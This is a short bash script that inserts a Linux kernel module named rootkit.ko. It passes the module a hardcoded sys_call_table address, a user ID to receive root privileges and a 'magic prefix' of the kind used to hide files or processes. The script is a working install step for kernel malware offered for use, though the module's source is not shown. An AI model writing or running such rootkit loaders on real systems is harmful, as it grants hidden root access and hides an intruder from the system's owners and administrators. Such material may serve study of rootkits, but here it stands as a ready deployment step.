#!/bin/bash

#Find the sys_call_table symbol's address from the /boot/System.map
TABLE_ADDR=ffffffff81801320
ROOT_UID=1001
MAGIC_PREFIX=\$sys\$
#Insert the rootkit module, providing some parameters
insmod rootkit.ko table_addr=0x$TABLE_ADDR root_uid=$ROOT_UID magic_prefix=$MAGIC_PREFIX
